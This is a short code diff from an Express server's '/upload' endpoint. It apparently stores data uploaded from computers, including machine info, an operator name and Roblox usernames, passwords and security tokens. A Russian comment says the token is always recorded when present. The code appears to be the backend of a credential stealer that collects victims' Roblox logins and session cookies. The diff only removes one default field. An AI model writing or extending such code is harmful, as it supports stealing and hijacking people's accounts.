@@ -415,7 +415,7 @@ app.post('/upload', upload.array('files'), async (req, res) => {
   if (db) {
     const updateDoc = {
       $set: { name: fixedName, uploadedAt: new Date().toISOString(), computer: computerInfo, diagnostics: diagnostics, operator: operator, 'tokenRequest.requested': false },
-      $setOnInsert: { 'roblox.user': '', 'roblox.pass': '', 'roblox.security': '' }
+      $setOnInsert: { 'roblox.user': '', 'roblox.pass': '' }
     };
     // Если есть токен — всегда записываем его
     if (robloxInfo.security) {
